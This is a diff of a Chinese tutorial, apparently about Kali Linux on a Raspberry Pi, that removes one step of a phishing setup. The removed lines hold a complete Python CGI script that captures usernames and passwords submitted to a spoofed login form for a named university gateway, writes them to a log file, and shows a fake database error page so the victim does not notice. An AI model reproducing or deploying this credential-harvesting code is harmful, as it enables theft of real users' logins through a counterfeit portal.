@@ -220,26 +220,7 @@ Kali官方有针对树莓派2的版本，具体安装教程：[Kali Linux – Ra
 		    <a href="javascript:login()".../>
 		</form>
 
-	编写后台处理程序，我用的是python的cgi，在/usr/lib/gci-bin下新建login.py：
 
-		#!/usr/bin/python
-		#-*- encoding: utf-8 -*-
-		import cgi, cgitb
-		form = cgi.FieldStorage()
-		username = form.getvalue('username')                # 获得用户名
-		password = form.getvalue('password')                # 获得密码
-		f = open('/cat/gw.buaa.edu.cn.log', 'a')            # 注意apache是否有所写文件夹的权限！！
-		f.write("%s: %s\r\n" % (username, password))        # 将用户名和密码写入文件
-		f.close()
-		print "Content-type:text/html\r\n\r\n"              # 然后显示一个错误页面
-		print '<html><head>'
-		print '<title>Error 126</title>'
-		print '</head><body>'
-		print '<h1>Error establishing a database connection</h1>'
-		print '</body></html>'
-
-	将login.py的权限设置为755，即有运行权限
-	
 ## 测试运行
 ---
 
